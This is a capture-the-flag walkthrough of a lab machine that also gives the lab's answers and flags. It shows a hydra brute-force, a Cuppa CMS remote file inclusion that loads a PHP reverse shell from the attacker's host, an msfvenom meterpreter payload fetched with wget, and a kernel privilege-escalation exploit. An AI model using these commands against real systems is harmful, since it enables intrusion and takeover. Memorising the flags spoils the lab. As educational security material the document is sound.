# Questions

1. What is Miles password for his emails?
	1. cyborg007haloterminator
2. What is the hidden directory?
	1. /45kra24zxs28v3yd
3. What is the vulnerability called when you can include a remote file for malicious purposes?
	1. remote file inclusion
4. What is the user flag?
	1. 7ce5c2109a40f958099283600a9ae807
5. What is the root flag?
	1. 3f0372db24753accc7179a282cd6a949

# Write-up

## Enumeration

To start, we want to get as much information on the target system as possible. Navigating to the IP, we see that there's a webserver running that we can fuzz for different directory endpoints. It's also worth checking for other open ports or running services
``` bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.4.188/FUZZ -o ffuf.json
sudo nmap -sV -sC --version-all -T4 -v --script=vuln $TARGET_IP -oN nmap.txt
smbmap -H 10.10.4.188 -g smbmap.txt -r /
```

Running the above commands, we see that the webserver is running on ubuntu and using apache 2.4.18; The website itself has  a couple of interesting routes, but the only one that we have access to currently, outside of the deafult, is "/squirrelmail" Noticing that there's an SMB share running we can also check for what we have access to there, in which case we have read only access with an anonymous login and there's 3 other shares availble, with the one of interest being for the user milesdyson.

Navigating to the afformentioned route, we see that it's running squirrelmail version 1.4.23. We can also access the anonymous share; doing so we see that there are 2 different files of interest, attention.txt and log1.txt; copying the files over and viewing their contents, log1 seems to contain a list of passwords most likely for the user Miles Dyson.

## Exploitation

We can try these passwords  on the SMBshare, squirrelmail, or over ssh to see if we can gain access to anything in the system. Starting with squirrel mail, when we fill out the form the site sends a POST request to "/squirrelmail/src/redirect.php" using hydra we can brute force the login using the command below.

`hydra -l milesdyson -P ./log1.txt "http-form-post://10.10.4.188:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:user or password incorrect" -o hydra.txt`

Running the command gives us the login milesdyson:cyborg007haloterminator

Once we've logged into the web server, we see that there's a password reset email sent to the user. We can use this password, )s{A&2Z=F^n_E.B\` to access the user's SMBshare.

`smbshare -U milesdyson //SKYNET/milesdyson -I $TARGET_IP`

going through the files of the smb share, we see a file called important under notes. Reading from the file gives a CMS endpoint "/45kra24zxs28v3yd" because we have a new endpoint, we want to enumerate that endpoint to see if there are any interesting sub directories. In this case we can re-run the earlier ffuf command but fuzzing a different directory. 

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.216.94/45kra24zxs28v3yd/FUZZ -o ffuf-2.json`

doing so gives us a new /administrator route which contains a cuppa cms login page. Searching on exploit db, we see that there's a RFI vulnerability in cuppa cms that we can exploit to gain a reverse shell.

Downloading a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), starting a nc listener and webserver then navigating to "/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.50.190:9000/shell.php" executes our payload giving us a reverse shell and letting us read the user flag.

```bash
python3 -m http.server 9000
nc -nlvp 5000
cat /home/milesdyson/user.txt
```

Now that we have a reverse shell, we can attempt to upgrade to a meterpreter shell. All we need to do is generate the payload using mfsvenom then download and run it on the target system.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=8080 -f elf -o shell.elf
milesdyson@target $ wget http://ATTACKER_IP:9000/shell.elf
msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6> set LHOST tun0
msf6> set LPORT 8080
msf6> run
```

## Privilege Escalation

Now that we have a more stable session, we can attempt to escalate our privileges to root. Uploading and running something like [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) will give a lot of information on potential vectors for us to do just that.

We can also search for the ubuntu version directly in exploitdb to see if there are any privilege escalation vulnerabilities. In this case, searching for 4.8.0-58 gives us one potential script.

``` bash
cp /usr/share/exploitdb/exploits/linux/local/43418.c pwn.c
meterpreter> upload pwn.c
meterpreter> shell
www-data@target $ gcc pwn.c -o pwn
www-data@target $ ./pwn
root@target $ cat /root/root.txt
```

Uploading the script to the target machine, compiling it using gcc and executing it gives us a root shell. Now that we have root all we need to do is read from the root flag located at /root/root.txt